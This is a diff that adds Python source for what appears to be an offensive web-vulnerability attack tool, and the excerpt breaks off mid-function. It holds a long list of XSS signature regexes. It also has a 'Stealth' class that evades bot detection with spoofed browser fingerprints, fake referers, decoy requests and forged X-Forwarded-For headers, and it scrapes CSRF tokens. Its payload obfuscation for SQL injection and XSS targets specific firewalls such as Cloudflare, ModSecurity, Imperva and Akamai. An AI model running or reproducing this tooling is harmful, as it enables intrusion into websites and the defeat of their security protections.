+    (r"<form[^>]+action=\"javascript:","JS URI in Form Action"),
+    (r"<iframe[^>]+srcdoc=","Iframe srcdoc Injection"),
+    (r"<iframe[^>]+src=\"javascript:","JS URI in Iframe"),
+    (r"<object[^>]+data=\"javascript:","JS URI in Object"),
+    (r"<embed[^>]+src=\"javascript:","JS URI in Embed"),
+    (r"onanimationstart=","CSS Animation Hook"),
+    (r"onwebkitanimationend=","CSS Animation Hook"),
+    (r"ontransitionend=","CSS Transition Hook"),
+    (r"onanimationend=","CSS Animation Hook"),
+    (r"onpointerdown=","Pointer Event Hook"),
+    (r"onpointerup=","Pointer Event Hook"),
+    (r"onpointerenter=","Pointer Event Hook"),
+    (r"ontoggle=","Toggle Event Hook"),
+    (r"onbeforetoggle=","Before Toggle Hook"),
+    (r"onbegin=","SVG Animate Begin"),
+    (r"onend=","SVG Animate End"),
+    (r"ondrag=","Drag Event Hook"),
+    (r"ondragstart=","Drag Start Hook"),
+    (r"ondragend=","Drag End Hook"),
+    (r"ondrop=","Drop Event Hook"),
+    (r"onreset=","Form Reset Hook"),
+    (r"onsearch=","Search Event Hook"),
+    (r"oncuechange=","Media Cue Hook"),
+    (r"oncanplay=","Media CanPlay Hook"),
+    (r"canplaythrough=","Media Hook"),
+    (r"onauxclick=","Aux Click Hook"),
+    (r"oncontextmenu=","Context Menu Hook"),
+    (r"oncopy=","Copy Event Hook"),
+    (r"oncut=","Cut Event Hook"),
+    (r"onpaste=","Paste Event Hook"),
+    (r"onpageshow=","Page Show Hook"),
+    (r"onpagehide=","Page Hide Hook"),
+    (r"onbeforeunload=","Before Unload Hook"),
+    (r"onhashchange=","Hash Change Hook"),
+    (r"onpopstate=","Pop State Hook"),
+    (r"onstorage=","Storage Hook"),
+    (r"onbeforeprint=","Before Print Hook"),
+    (r"onafterprint=","After Print Hook"),
+    (r"onloadstart=","Load Start Hook"),
+    (r"onprogress=","Progress Hook"),
+    (r"onsuspend=","Suspend Hook"),
+    (r"onabort=","Abort Hook"),
+    (r"onvolumechange=","Volume Change Hook"),
+    (r"onratechange=","Rate Change Hook"),
+    (r"onseeking=","Seeking Hook"),
+    (r"onseeked=","Seeked Hook"),
+    (r"onstalled=","Stalled Hook"),
+    (r"onsuspend=","Suspend Hook"),
+    (r"ontimeupdate=","Time Update Hook"),
+    (r"onwaiting=","Waiting Hook"),
+    (r"onmessage=","Message Hook"),
+    (r"onmessageerror=","Message Error Hook"),
+    (r"onbeforematch=","Before Match Hook"),
+    (r"oncontentvisibilityautostatechange=","Visibility Auto Hook"),
+    (r"onsecuritypolicyviolation=","CSP Violation Hook"),
+    (r"ontransitionrun=","Transition Run Hook"),
+    (r"ontransitionstart=","Transition Start Hook"),
+    (r"ontransitioncancel=","Transition Cancel Hook"),
+    (r"onanimationcancel=","Animation Cancel Hook"),
+    (r"onanimationiteration=","Animation Iteration Hook"),
+    (r"alarm\(\)","Alarm Call"),
+    (r"confirm\(\w+\)","Confirm Box"),
+    (r"prompt\(\w+\)","Prompt Box"),
+    (r"window\.open\(","Window Open"),
+    (r"window\.location\s*=","Location Assignment"),
+    (r"location\.href\s*=","Href Assignment"),
+    (r"location\.replace\(","Location Replace"),
+    (r"location\.assign\(","Location Assign"),
+    (r"navigator\.userAgent","UA Leak"),
+    (r"navigator\.platform","Platform Leak"),
+    (r"navigator\.language","Language Leak"),
+    (r"navigator\.cookieEnabled","Cookie Check"),
+    (r"navigator\.hardwareConcurrency","Hardware Leak"),
+    (r"navigator\.deviceMemory","Memory Leak"),
+    (r"navigator\.geolocation","Geolocation Access"),
+    (r"navigator\.clipboard\.writeText","Clipboard Write"),
+    (r"navigator\.share","Share API"),
+    (r"navigator\.permissions\.query","Permissions Query"),
+    (r"navigator\.mediaDevices","Media Devices Access"),
+    (r"navigator\.contacts","Contacts Access"),
+    (r"window\.name","window.name"),
+    (r"window\.opener","Opener Leak"),
+    (r"window\.parent","Parent Leak"),
+    (r"window\.top","Top Leak"),
+    (r"window\.frames","Frames Leak"),
+    (r"window\.localStorage","localStorage Access"),
+    (r"window\.sessionStorage","sessionStorage Access"),
+    (r"window\.indexedDB","IndexedDB Access"),
+    (r"new\s+Worker\(","Web Worker"),
+    (r"new\s+SharedWorker\(","Shared Worker"),
+    (r"new\s+ServiceWorker\(","Service Worker"),
+    (r"fetch\(.*then\(","Fetch Chain"),
+    (r"XMLHttpRequest","XHR"),
+    (r"\.open\(['\"]GET","XHR GET"),
+    (r"\.open\(['\"]POST","XHR POST"),
+    (r"WebSocket","WebSocket"),
+    (r"EventSource","SSE Source"),
+    (r"new\s+Image\(\)","Image Object"),
+    (r"new\s+Audio\(\)","Audio Object"),
+    (r"new\s+Video\(\)","Video Object"),
+    (r"new\s+Function\(","Dynamic Function"),
+    (r"setTimeout\(.*alert","Timeout Alert"),
+    (r"setInterval\(.*alert","Interval Alert"),
+    (r"requestAnimationFrame","RAF Hook"),
+    (r"window\.setTimeout","Window Timeout"),
+    (r"document\.write","Document Write"),
+    (r"document\.writeln","Document Writeln"),
+    (r"document\.createElement","Create Element"),
+    (r"\.innerHTML\s*=","Inner HTML"),
+    (r"\.outerHTML\s*=","Outer HTML"),
+    (r"\.insertAdjacentHTML","Insert Adjacent HTML"),
+    (r"\.textContent","Text Content"),
+    (r"\.innerText","Inner Text"),
+    (r"\.setAttribute\(['\"]onclick","On Click Set"),
+    (r"\.setAttribute\(['\"]onerror","On Error Set"),
+    (r"\.addEventListener\(['\"]click","Click Listener"),
+    (r"\.addEventListener\(['\"]load","Load Listener"),
+    (r"\.addEventListener\(['\"]message","Message Listener"),
+    (r"<img[^>]+src=\"x:","Invalid Src"),
+    (r"<img[^>]+onerror=","IMG Error Handler"),
+    (r"<img[^>]+src=x:x","Malformed Src"),
+    (r"'-alert\(1\)-'","Prompt Injection"),
+    (r";alert\(1\)//","Inline Injection"),
+    (r"\"-alert\(1\)-\"","Inline Quote Injection"),
+    (r"<output>","Output Tag"),
+    (r"<menu>","Menu Tag"),
+    (r"<menuitem>","Menu Item Tag"),
+    (r"<dialog[^>]+open>","Dialog Tag"),
+    (r"<slot>","Slot Tag"),
+    (r"<template>","Template Tag"),
+    (r"<content>","Content Tag"),
+    (r"<shadow>","Shadow Tag"),
+    (r"<style[^>]*>@import","Style Import"),
+    (r"<style[^>]*>.*expression","CSS Expression"),
+    (r"<link[^>]+href=javascript","Link JS URI"),
+    (r"<meta[^>]+http-equiv=\"refresh\".*url=javascript:","Meta Refresh JS"),
+    (r"<meta[^>]+http-equiv=refresh[^>]+javascript:","Meta Refresh JS"),
+    (r"<base[^>]+href=javascript:","Base JS URI"),
+    (r"<sup>script","Obfuscated Script"),
+    (r"<sub>script","Obfuscated Script"),
+    (r"<image[^>]+onerror=","Image Tag Variant"),
+    (r"<ifr[^>]+src=javascript:","Obfuscated Iframe"),
+    (r"<iFRAME","Case Obfuscation"),
+    (r"<Img","Case Obfuscation IMG"),
+    (r"<Script","Case Obfuscation Script"),
+    (r"<ScRiPt","Mixed Case Script"),
+    (r"<.Style","Case Style"),
+    (r"<svg/onload","SVG Void Element"),
+    (r"<svg>.*<script","SVG Script"),
+    (r"<math[^>]*><mi[^>]*href=","MathML XLink"),
+    (r"<annotation-xml[^>]*><script","Annotation XML"),
+    (r"<foreignObject","Foreign Object"),
+    (r"<use[^>]+href=","Use XLink"),
+    (r"<set[^>]+to=javascript:","Set To JS"),
+    (r"<animate[^>]+to=javascript:","Animate To JS"),
+    (r"<animateTransform","Animate Transform"),
+    (r"&lt;script&gt;","Encoded Script Tag"),
+    (r"&lt;img.*&gt;","Encoded IMG"),
+    (r"javascript&colon;","Encoded Colon"),
+    (r"&Tab;","Encoded Tab"),
+    (r"&NewLine;","Encoded Newline"),
+    (r"%3Cscript","URL Encoded Script"),
+    (r"%3Cimg","URL Encoded IMG"),
+    (r"\\x3c","Hex Encoded LT"),
+    (r"\\u003c","Unicode Encoded LT"),
+    (r"&NewLine;&NewLine;","Double Newline"),
+    (r"data:text/html","Data URI"),
+    (r"data:application/javascript","JS Data URI"),
+]
+
+TO = 10
+
+class Stealth:
+    def __init__(self):
+        self.mind=0.3; self.maxd=1.5
+        self.no_delay=False
+        self.proxy=None; self.proxies=[]; self.proxy_idx=0
+        self.cookies={}; self.hdrs={}
+        self.session_cookies={}
+        self.req_count=0
+        self.blocked_count=0
+        self.captcha_detected=False
+        self.waf_name=None
+        self.was_blocked=False
+        self.target_history=[]
+        self.referer_chain=[]
+        self.visited_paths=[]
+        self.last_status=200
+        self.last_length=0
+        self._adaptive_delay_min=0.3
+        self._adaptive_delay_max=1.5
+        self._consecutive_errors=0
+        self._burst_queue=[]
+        self._human_read_speed=random.uniform(200,500)
+        self._session_start=time.time()
+        self._pages_read=0
+        self._last_click_time=0
+        self._tab_switches=0
+        self._scroll_depth=0
+        self._hover_pos=0
+        self._engagement_score=1.0
+        self.fingerprint=random.choice(["chrome_win","chrome_mac","chrome_linux",
+                                        "firefox_win","firefox_mac","firefox_linux",
+                                        "safari_mac","edge_win"])
+        self._tls_ciphers={
+            "chrome":["TLS_AES_128_GCM_SHA256","TLS_AES_256_GCM_SHA256",
+                      "TLS_CHACHA20_POLY1305_SHA256"],
+            "firefox":["TLS_AES_128_GCM_SHA256","TLS_CHACHA20_POLY1305_SHA256",
+                       "TLS_AES_256_GCM_SHA256"],
+            "safari":["TLS_AES_128_GCM_SHA256","TLS_AES_256_GCM_SHA256"],
+            "edge":["TLS_AES_128_GCM_SHA256","TLS_AES_256_GCM_SHA256"],
+        }
+        self._alpn=["h2","http/1.1","http/1.1","h2,http/1.1"]
+        self._tls_versions=["TLS 1.3","TLS 1.3","TLS 1.3","TLS 1.2"]
+        self._http_versions=["HTTP/2","HTTP/1.1","HTTP/1.1","HTTP/2"]
+        self._methods=["GET","GET","GET","GET","GET","HEAD","POST"]
+        self._content_types=[
+            "application/x-www-form-urlencoded","text/plain;charset=UTF-8",
+            "multipart/form-data","application/json","text/xml"
+        ]
+        self._csp_nonceptr=base64.b64encode(os.urandom(8)).decode()[:12]
+        self._isp_ips=[
+            ("AS8075 Microsoft",[(13,80),(40,120),(52,160)]),
+            ("AS15169 Google",[(8,35),(34,80),(64,130)]),
+            ("AS7018 AT&T",[(12,100),(64,120),(76,130)]),
+            ("AS32934 Facebook",[(31,65),(57,75),(66,129)]),
+            ("AS4134 ChinaNet",[(1,60),(110,200),(220,255)]),
+            ("AS7922 Comcast",[(23,40),(50,100),(67,80)]),
+            ("AS28573 Claro",[(177,190),(187,200),(201,220)]),
+        ]
+        self._xss_padding=["_","__","utm_source","ref","lang","v","ver","t",
+                           "nocache","rnd","_t","ts","cb","callback","jsonp"]
+        self._accept_langs=[
+            "en-US,en;q=0.9","en-GB,en;q=0.8,en-US;q=0.6",
+            "en-US,en;q=0.5","en,en;q=0.9",
+            "en-US,en;q=0.9,ar;q=0.8","en-US,en;q=0.9,fr;q=0.7",
+            "en-US,en;q=0.9,de;q=0.7,es;q=0.5","en-US,en;q=0.8",
+            "en-US,en;q=0.9,ja;q=0.7","en-US,en;q=0.9,zh-CN;q=0.6",
+            "en-US,en;q=0.9,pt;q=0.7","en-US,en;q=0.9,ko;q=0.6",
+            "en-US,en;q=0.9,ru;q=0.5","en-US,en;q=0.9,it;q=0.6",
+            "en-US,en;q=0.9,nl;q=0.5","en-US,en;q=0.9,tr;q=0.5",
+        ]
+        self._accept_encs=[
+            "gzip, deflate, br","gzip, deflate","br, gzip, deflate",
+            "gzip, deflate, br;q=0.9","deflate, gzip;q=0.8, *;q=0.5",
+            "gzip, deflate, br;q=1.0, *;q=0.5",
+        ]
+        self._connections=["keep-alive","Keep-Alive","close"]
+        self._cache_controls=["max-age=0","no-cache","max-age=0, no-cache",
+                              "max-stale=0","no-store","no-cache, no-store"]
+        self._sec_ch_ua=[
+            '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            '"Not:A-Brand";v="99", "Chromium";v="120", "Google Chrome";v="120"',
+            '"Chromium";v="120", "Not(A:Brand";v="24"',
+            '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
+            '"Not_A Brand";v="8", "Chromium";v="121", "Google Chrome";v="121"',
+            '"Chromium";v="122", "Not(A:Brand";v="24"',
+            '"Google Chrome";v="122", "Chromium";v="122", "Not;A=Brand";v="99"',
+        ]
+        self._sec_ch_ua_mobile=["?0","?0","?0","?1","?0"]
+        self._viewport_widths=["1920","1366","1536","1440","1280","2560","1680","360","390","414"]
+        self._viewport_heights=["1080","768","864","900","720","1440","1050","640","844","896"]
+        self._color_depths=["24","30","32"]
+        self._platforms_map={
+            "chrome_win":'"Windows"',"chrome_mac":'"macOS"',
+            "chrome_linux":'"Linux"',"firefox_win":'"Windows"',
+            "firefox_mac":'"macOS"',"firefox_linux":'"Linux"',
+            "safari_mac":'"macOS"',"edge_win":'"Windows"',
+        }
+        self._header_order={
+            "chrome":["Host","Connection","sec-ch-ua","sec-ch-ua-mobile",
+                      "sec-ch-ua-platform","Upgrade-Insecure-Requests","User-Agent",
+                      "Accept","Sec-Fetch-Site","Sec-Fetch-Mode","Sec-Fetch-User",
+                      "Sec-Fetch-Dest","Accept-Encoding","Accept-Language","Cookie"],
+            "firefox":["Host","User-Agent","Accept","Accept-Language",
+                       "Accept-Encoding","Connection","Sec-Fetch-Dest",
+                       "Sec-Fetch-Mode","Sec-Fetch-Site","Sec-Fetch-User","Cookie"],
+            "safari":["Host","Accept","User-Agent","Accept-Language",
+                      "Accept-Encoding","Connection","Cookie"],
+            "edge":["Host","Connection","sec-ch-ua","sec-ch-ua-mobile",
+                    "sec-ch-ua-platform","Upgrade-Insecure-Requests","User-Agent",
+                    "Accept","Sec-Fetch-Site","Sec-Fetch-Mode","Sec-Fetch-User",
+                    "Sec-Fetch-Dest","Accept-Encoding","Accept-Language","Cookie"],
+        }
+
+    def delay(self):
+        if self.no_delay: return
+        base=random.uniform(self._adaptive_delay_min,self._adaptive_delay_max)
+        jitter=random.gauss(0,base*0.3)
+        t=max(0.05,base+jitter)
+        if self.captcha_detected:
+            t+=random.uniform(10.0,30.0)
+        if self.was_blocked:
+            t+=random.uniform(5.0,15.0)
+        if self.req_count>0 and self.req_count%5==0:
+            t+=random.uniform(2.0,5.0)
+        if self.req_count>0 and self.req_count%12==0:
+            t+=random.uniform(5.0,12.0)
+        if self.req_count>0 and self.req_count%20==0:
+            t+=random.uniform(8.0,20.0)
+        if self.last_length>0:
+            read_time=self.last_length/self._human_read_speed
+            t=max(t,read_time*0.3)
+        if random.random()>0.85:
+            t+=random.uniform(3.0,8.0)
+        if random.random()>0.95:
+            t+=random.uniform(15.0,45.0)
+        if self._pages_read>0 and self._pages_read%4==0:
+            t+=random.uniform(10.0,25.0)
+        self._pages_read+=1
+        time.sleep(t)
+
+    def adapt(self,resp):
+        if not resp: return
+        self.last_status=resp.get("s",0)
+        self.last_length=resp.get("l",0)
+        ct=resp.get("c","").lower()
+        hs=resp.get("h",{})
+        status=resp.get("s",200)
+        if status in [403,429,503]:
+            self.blocked_count+=1
+            self.was_blocked=True
+            self._adaptive_delay_min=min(self._adaptive_delay_min*1.5,5.0)
+            self._adaptive_delay_max=min(self._adaptive_delay_max*1.5,15.0)
+            self._consecutive_errors+=1
+            self._engagement_score=max(0.1,self._engagement_score*0.5)
+        else:
+            self.was_blocked=False
+            if self._consecutive_errors>0: self._consecutive_errors-=1
+            if self._adaptive_delay_min>self.mind:
+                self._adaptive_delay_min=max(self._adaptive_delay_min*0.8,self.mind)
+            if self._adaptive_delay_max>self.maxd:
+                self._adaptive_delay_max=max(self._adaptive_delay_max*0.8,self.maxd)
+            self._engagement_score=min(2.0,self._engagement_score*1.05)
+        captcha_sigs=["captcha","recaptcha","hcaptcha","turnstile","cf-turnstile",
+                      "g-recaptcha","h-captcha","cf-challenge","challenge-platform",
+                      "px-captcha","kasada","akamai-bot","datadome","shape security",
+                      "perimeterx","arcesiun","silverline"]
+        for sig in captcha_sigs:
+            if sig in ct or sig in str(hs).lower():
+                self.captcha_detected=True; break
+        bot_sigs=["blocked","denied","rate limit","too many","abuse","bot detect",
+                  "automated","scraper","spider","crawler","security check",
+                  "please verify","are you human","not a robot","prove you"]
+        for sig in bot_sigs:
+            if sig in ct:
+                self._engagement_score=max(0.1,self._engagement_score*0.7); break
+        waf_sigs=[(r"cloudflare","Cloudflare"),(r"akamai","Akamai"),
+                  (r"incapsula","Incapsula"),(r"sucuri","Sucuri"),
+                  (r"mod_security","ModSecurity"),(r"imperva","Imperva"),
+                  (r"barracuda","Barracuda"),(r"f5","F5"),
+                  (r"fortiweb","FortiWeb"),(r"citrix","Citrix"),
+                  (r"aws.waf","AWS WAF"),(r"azure.front.door","Azure WAF"),
+                  (r"cloudfront","CloudFront"),(r"datadome","DataDome"),
+                  (r"shape","Shape Security"),(r"perimeterx","PerimeterX"),
+                  (r"fastly","Fastly WAF"),(r"wordfence","Wordfence")]
+        body=ct+str(hs)
+        for pat,name in waf_sigs:
+            if re.search(pat,body,re.IGNORECASE):
+                self.waf_name=name; break
+
+    def next_proxy(self):
+        if self.proxies:
+            p=self.proxies[self.proxy_idx%len(self.proxies)]
+            self.proxy_idx+=1
+            return p
+        return self.proxy
+
+    def rotate_fingerprint(self):
+        old=self.fingerprint
+        choices=["chrome_win","chrome_mac","chrome_linux",
+                 "firefox_win","firefox_mac","firefox_linux",
+                 "safari_mac","edge_win"]
+        choices=[c for c in choices if c!=old]
+        self.fingerprint=random.choice(choices)
+
+    def update_session(self,resp):
+        if resp and "h" in resp:
+            sc=resp["h"].get("Set-Cookie","")
+            if sc:
+                for part in sc.split(","):
+                    part=part.strip()
+                    if "=" in part:
+                        k=part.split("=")[0].strip()
+                        v=part.split("=",1)[1].split(";")[0].strip()
+                        if "httponly" not in k.lower() and "path" not in k.lower():
+                            self.session_cookies[k]=v
+            for h in ["x-csrf-token","x-xsrf-token","csrf-token","_token",
+                      "x-request-id","x-correlation-id","etag"]:
+                v=resp["h"].get(h,"")
+                if v: self.session_cookies[h]=v
+
+    def build_referer(self,url):
+        ps=urlparse(url)
+        domain=ps.netloc
+        if self.referer_chain and random.random()>0.3:
+            ref=self.referer_chain[-1]
+            self.referer_chain.append(url)
+            return ref
+        paths=["/","/home","/search","/categories","/products",
+               "/about","/contact","/blog","/faq","/login","/signup"]
+        search_engines=[
+            ("https://www.google.com/search?q=",["&btnK=Google+Search","&source=hp","&sxsrf="]),
+            ("https://www.bing.com/search?q=",["&form=QBLH","&sp=-1"]),
+            ("https://duckduckgo.com/?q=",["&ia=web"]),
+            ("https://search.yahoo.com/search?p=",["&fr=yfp-t"]),
+            ("https://yandex.com/search/?text=",["&lr="]),
+        ]
+        social=[
+            (f"https://www.facebook.com/sharer.php?u={ps.scheme}://{domain}","fb"),
+            (f"https://www.twitter.com/{domain}","twitter"),
+            ("https://www.linkedin.com/feed/","linkedin"),
+            ("https://www.reddit.com/r/all/comments/","reddit"),
+        ]
+        if random.random()>0.4:
+            se,extra=random.choice(search_engines)
+            ref=se+urllib.parse.quote(random.choice(paths))+random.choice(extra)
+        elif random.random()>0.5:
+            ref,_=random.choice(social)
+        elif self.visited_paths:
+            ref=f"{ps.scheme}://{domain}{random.choice(self.visited_paths)}"
+        else:
+            ref=f"{ps.scheme}://{domain}/"
+        self.referer_chain.append(url)
+        if len(self.referer_chain)>20:
+            self.referer_chain=self.referer_chain[-10:]
+        return ref
+
+    def browser_headers(self,url=None):
+        fp=self.fingerprint
+        h={}
+        if "chrome" in fp or "edge" in fp:
+            h["sec-ch-ua"]=random.choice(self._sec_ch_ua)
+            h["sec-ch-ua-mobile"]=random.choice(self._sec_ch_ua_mobile)
+            h["sec-ch-ua-platform"]=self._platforms_map.get(fp,'"Windows"')
+            h["Upgrade-Insecure-Requests"]="1"
+            h["Sec-Fetch-Dest"]="document"
+            h["Sec-Fetch-Mode"]="navigate"
+            h["Sec-Fetch-Site"]="none" if self.req_count==0 else random.choice(
+                ["same-origin","none","same-site","same-origin","same-origin"])
+            h["Sec-Fetch-User"]="?1"
+            if "edge" in fp:
+                h["sec-ch-ua"]=random.choice([
+                    '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
+                    '"Not:A-Brand";v="99", "Chromium";v="122", "Microsoft Edge";v="122"',
+                ])
+        elif "firefox" in fp:
+            h["Sec-Fetch-Dest"]="document"
+            h["Sec-Fetch-Mode"]="navigate"
+            h["Sec-Fetch-Site"]="none" if self.req_count==0 else random.choice(
+                ["same-origin","none","same-site","same-origin"])
+            h["Sec-Fetch-User"]="?1"
+            h["TE"]="trailers"
+        elif "safari" in fp:
+            h["Accept"]="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+            h["Upgrade-Insecure-Requests"]="1"
+        h["Accept-Language"]=random.choice(self._accept_langs)
+        h["Accept-Encoding"]=random.choice(self._accept_encs)
+        h["Connection"]=random.choice(self._connections)
+        h["Cache-Control"]=random.choice(self._cache_controls)
+        h["DNT"]=random.choice(["1","0","1"])
+        if random.random()>0.7:
+            h["Viewport-Width"]=random.choice(self._viewport_widths)
+            h["Device-Memory"]=random.choice(["2","4","8","16"])
+            h["Downlink"]=random.choice(["1.4","2.6","5.6","10"])
+            h["ECT"]=random.choice(["4g","3g"])
+            h["RTT"]=random.choice(["0","50","100"])
+        if random.random()>0.8:
+            h["Sec-GPC"]="1"
+        if random.random()>0.6:
+            h["Purpose"]="prefetch" if self.req_count%3==0 else "preflight"
+        if random.random()>0.9:
+            h["Save-Data"]="on"
+        return h
+
+    def pre_browse(self,url):
+        parsed=urlparse(url)
+        base=f"{parsed.scheme}://{parsed.netloc}"
+        homepage=req(base,stealth=False,to=5)
+        if homepage and not homepage.get("e"):
+            self.update_session(homepage)
+            self.visited_paths.append("/")
+            links=re.findall(r'href=["\'](/[^"\']+)["\']',homepage["c"])
+            self.visited_paths.extend(links[:5])
+        paths=["/robots.txt","/sitemap.xml","/favicon.ico",
+               "/.well-known/security.txt","/humans.txt",
+               "/apple-touch-icon.png","/browserconfig.xml",
+               "/manifest.json","/assets/","/static/","/css/","/js/"]
+        for p in random.sample(paths,random.randint(2,4)):
+            try:
+                r=req(base+p,stealth=False,to=3)
+                if r and not r.get("e"):
+                    self.update_session(r)
+                    self.visited_paths.append(p)
+            except: pass
+
+    def decoy(self,url):
+        parsed=urlparse(url)
+        base=f"{parsed.scheme}://{parsed.netloc}"
+        paths=["/robots.txt","/sitemap.xml","/favicon.ico",
+               "/.well-known/security.txt","/humans.txt",
+               "/apple-touch-icon.png","/browserconfig.xml",
+               "/manifest.json","/service-worker.js",
+               "/sitemap_index.xml","/rss","/feed","/atom.xml",
+               "/wp-json/","/graphql","/swagger.json","/openapi.json"]
+        for p in random.sample(paths,random.randint(1,3)):
+            try: req(base+p,stealth=False,to=3)
+            except: pass
+
+    def obf(self,p):
+        r=p
+        if not self.waf_name:
+            return p
+        if self.waf_name:
+            r=self._waf_bypass(r,self.waf_name)
+        for kw in ["OR","AND","UNION","SELECT","FROM","WHERE","SLEEP","IF",
+                    "WAITFOR","BENCHMARK","CONCAT","SUBSTRING","ASCII","LENGTH",
+                    "ORDER","GROUP","HAVING","NULL","script","alert","onerror",
+                    "onload","svg","img","body","iframe","javascript","document",
+                    "cookie","eval","fetch","location","EXEC","xp_cmdshell",
+                    "information_schema","table_name","column_name","version",
+                    "database","user","load_file","INTO","OUTFILE","DUMPFILE",
+                    "LOAD","DATA","INFILE","CHAR","CHR","MID","LEFT","RIGHT",
+                    "UPPER","LOWER","REVERSE","REPLACE","INSERT","UPDATE",
+                    "DELETE","DROP","CREATE","ALTER","GRANT","REVOKE"]:
+            if re.search(re.escape(kw),r,re.IGNORECASE):
+                vs=[kw.lower(),kw.capitalize(),kw.upper(),
+                    "".join(c.upper() if random.random()>0.5 else c.lower() for c in kw)]
+                r=re.sub(re.escape(kw),random.choice(vs),r,flags=re.IGNORECASE)
+        cs=["/**/","/*%20*/","/**//**/","/*!*/","/*!50000*/","/*!40000*/",
+            "/*!30000*/","%00","%09","%0b","%0c","%0d%0a","%23","%2d%2d",
+            "--%0a","--%0d","%3c!--","/*+*/","%26%26"]
+        r=re.sub(r'\s+',lambda m:random.choice(cs),r)
+        ws=random.choice(["tab","nl","cr","ff","vt","norm","mixed"])
+        if ws=="tab": r=r.replace(" ","%09")
+        elif ws=="nl": r=r.replace(" ","%0A")
+        elif ws=="cr": r=r.replace(" ","%0D")
+        elif ws=="ff": r=r.replace(" ","%0C")
+        elif ws=="vt": r=r.replace(" ","%0B")
+        elif ws=="mixed":
+            r=r.replace(" ",random.choice(["%09","%0A","%0D","%0C","%0B","/**/","%20"]),1)
+        if random.random()>0.7: r=r.replace("'","%00'")
+        if random.random()>0.8: r=r.replace("'","'%00")
+        if random.random()>0.85: r=r.replace(" ","%00 ")
+        enc=random.choice(["single","double","triple","none"])
+        if enc=="single": r=urllib.parse.quote(r,safe="")
+        elif enc=="double": r=urllib.parse.quote(urllib.parse.quote(r,safe=""),safe="")
+        elif enc=="triple": r=urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(r,safe=""),safe=""),safe="")
+        if random.random()>0.8:
+            r=r.replace("<","\\u003c").replace(">","\\u003e")
+            r=r.replace("'","\\u0027").replace('"',"\\u0022")
+        if random.random()>0.85: r=r.replace("'","%C0%A7")
+        if random.random()>0.85: r=r.replace("'","%E0%80%A7")
+        if random.random()>0.85: r=r.replace("'","%EF%BC%87")
+        if random.random()>0.9: r=r.replace("'","&#39;").replace("<","&lt;").replace(">","&gt;")
+        if random.random()>0.9: r=r.replace("'","&#x27;").replace("<","&#x3c;").replace(">","&#x3e;")
+        if random.random()>0.85: r=r.replace("'","0x27")
+        if random.random()>0.8 and "CONCAT" in r and "CONCAT_WS" not in r:
+            r=r.replace("CONCAT","CONCAT_WS(0x7e,",1)
+        if random.random()>0.9: r=r.replace("'","CHAR(39)")
+        if random.random()>0.85: r=r.replace(" ","%20%20")
+        if random.random()>0.7:
+            for ch in "aeiou":
+                if random.random()>0.6 and "{{" not in r:
+                    r=r.replace(ch,"{{"+ch+"}}",1)
+        if random.random()>0.9: r=r.replace("'","%2527")
+        if random.random()>0.9: r=r.replace(" ","%2520")
+        if random.random()>0.85:
+            r=r.replace("OR","O%52").replace("AND","A%4eD")
+        return r
+
+    def _waf_bypass(self,p,waf):
+        r=p
+        w=waf.lower()
+        if "cloudflare" in w:
+            r=re.sub(r"(?i)union\s+select","UNI/**/ON SEL/**/ECT",r)
+            r=re.sub(r"(?i)or\s+1=1","%4fR 1%3D1",r)
+            r=re.sub(r"(?i)sleep","SLE%45EP",r)
+            r=re.sub(r"(?i)concat","CON%43AT",r)
+            r=re.sub(r"(?i)<script","<ScRiPt",r)
+            r=re.sub(r"(?i)alert","%61lert",r)
+        elif "modsecurity" in w:
+            r=re.sub(r"(?i)select","/*!50000SELECT*/",r)
+            r=re.sub(r"(?i)union","/*!50000UNION*/",r)
+            r=re.sub(r"(?i)from","/*!50000FROM*/",r)
+            r=re.sub(r"(?i)where","/*!50000WHERE*/",r)
+            r=re.sub(r"(?i)or ","/*!50000OR*/ ",r)
+        elif "imperva" in w or "incapsula" in w:
+            r=re.sub(r"(?i)alert","%2561lert",r)
+            r=re.sub(r"(?i)script","%2573cript",r)
+            r=re.sub(r"(?i)<","%253c",r)
+            r=re.sub(r"(?i)>","%253e",r)
+            r=re.sub(r"(?i)onerror","%256fnerror",r)
+        elif "akamai" in w:
+            r=re.sub(r"(?i)or\s+","O%52 ",r)
+            r=re.sub(r"(?i)and\s+","A%4eD ",r)
+            r=re.sub(r"(?i)= ","%3d ",r)
+            r=re.sub(r"(?i)union","%55NION",r)
+        elif "f5" in w or "barracuda" in w:
+            r=r.replace("'","%27%00")
+            r=re.sub(r"(?i)union","Uni%6fn",r)
+            r=re.sub(r"(?i)select","Sel%65ct",r)
+        elif "sucuri" in w:
+            r=re.sub(r"(?i)<script","<scr%69pt",r)
+            r=re.sub(r"(?i)onerror","on%65rror",r)
+            r=re.sub(r"(?i)onload","on%6foad",r)
+        elif "wordfence" in w:
+            r=re.sub(r"(?i)select","SeLeCt",r)
+            r=re.sub(r"(?i)union","UnIoN",r)
+            r=re.sub(r"(?i)concat","CoNcAt",r)
+        elif "datadome" in w:
+            r=re.sub(r"(?i)<","%E2%80%B9",r)
+            r=re.sub(r"(?i)>","%E2%80%BA",r)
+        elif "perimeterx" in w or "shape" in w:
+            r=re.sub(r"(?i)script","%73%63%72%69%70%74",r)
+            r=re.sub(r"(?i)alert","%61%6c%65%72%74",r)
+            r=re.sub(r"(?i)onerror","%6f%6e%65%72%72%6f%72",r)
+        return r
+
+    def rand_ip(self):
+        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+
+    def rand_ipv6(self):
+        return ":".join("%x"%random.randint(0,0xffff) for _ in range(8))
+
+    def ip_headers(self):
+        ip=self.rand_ip()
+        hdrs={
+            "X-Forwarded-For":ip,
+            "X-Real-IP":ip,
+            "X-Client-IP":self.rand_ip(),
+            "X-Originating-IP":self.rand_ip(),
+            "X-Remote-IP":self.rand_ip(),
+            "X-Remote-Addr":self.rand_ip(),
+            "Forwarded":f"for={ip};by={self.rand_ip()}",
+            "Via":f"1.1 {random.choice(['proxy','cache','gateway','squid','nginx','haproxy','varnish','cdn','www','web'])}",
+        }
+        if random.random()>0.7:
+            hdrs["X-Forwarded-For"]=f"{ip}, {self.rand_ip()}, {self.rand_ip()}"
+        if random.random()>0.8:
+            hdrs["X-Forwarded-Host"]=random.choice([self.rand_ip(),"localhost","127.0.0.1"])
+        if random.random()>0.85:
